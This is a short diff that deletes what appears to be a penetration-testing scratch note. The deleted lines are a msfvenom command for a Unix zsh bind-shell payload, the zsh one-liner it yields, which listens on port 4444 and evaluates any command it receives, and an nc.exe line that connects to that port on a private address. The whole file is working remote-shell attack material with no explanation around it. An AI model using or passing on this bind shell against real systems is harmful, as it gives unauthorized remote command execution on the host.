@@ -1,9 +1,0 @@
-
-msfvenom.bat -p cmd/unix/bind_zsh
-
-zmodload zsh/net/tcp;ztcp -l 4444;ztcp -a $REPLY;while read -r cmd <&$REPLY;do eval ${cmd} >&$REPLY;done;ztcp –c
-
-nc.exe 192.168.138.141 4444
-
-
-
